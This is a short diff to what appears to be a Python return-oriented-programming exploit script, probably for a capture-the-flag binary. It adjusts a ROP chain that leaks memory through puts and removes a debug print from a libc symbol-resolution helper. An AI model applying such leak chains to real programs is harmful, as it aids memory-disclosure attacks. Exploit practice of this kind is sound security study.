@@ -47,7 +47,8 @@ def leak(address):
         0x00400703, # pop rdi; ret;
         address,    # leak
         0x004004c0, # puts@plt
-                0x00400704, # ret
+        
+        0x00400704, # ret
         0x00400704, # ret
         0x00400704, # ret
         0x00400704, # ret
@@ -190,8 +191,6 @@ def get_symbol(symbol, strtab, symtab, libc_map):
             sym_addr = upleak_safe(symtab + i + 8)
 
             libc_map.put(sym, sym_addr, i)
-
-            #print("sym: " + str(sym, 'utf-8'))
 
             if sym == symbol:
                 return sym_addr
